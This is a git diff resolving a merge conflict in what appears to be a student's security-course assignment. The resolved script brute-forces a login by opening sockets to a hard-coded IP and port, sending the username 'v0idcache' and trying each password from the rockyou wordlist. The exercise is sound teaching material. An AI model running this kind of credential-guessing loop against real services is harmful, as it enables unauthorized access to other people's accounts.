@@ -26,7 +26,6 @@
 
 import socket
 
-<<<<<<< HEAD
 host = "142.93.136.81" # IP address here
 port = 1337 # Port here
 #wordlist = "/Users/mlui/389Rspring19/assignments/2_OSINT/rockyou.txt" # Point to wordlist file
@@ -34,13 +33,6 @@ wordlist = "/usr/share/wordlists/rockyou.txt"
 
 def brute_force():
 
-=======
-host = "" # IP address here
-port = 0000 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
-
-def brute_force():
->>>>>>> upstream/master
     """
         Sockets: https://docs.python.org/2/library/socket.html
         How to use the socket s:
@@ -57,11 +49,7 @@ def brute_force():
             Sending:
 
                 s.send("something to send\n")   # Send a newline \n at the end of your command
-<<<<<<< HEAD
           
-=======
-
->>>>>>> upstream/master
         General idea:
 
             Given that you know a potential username, use a wordlist and iterate
@@ -69,7 +57,6 @@ def brute_force():
             v0idcache's server.
     """
 
-<<<<<<< HEAD
     username = "v0idcache\n"   
     words = open(wordlist, "r").read().split('\n')
     for password in words:
@@ -83,11 +70,6 @@ def brute_force():
         data = s.recv(1024)
         if(data != "Fail\n"):
             break
-=======
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
-
->>>>>>> upstream/master
 
 
 
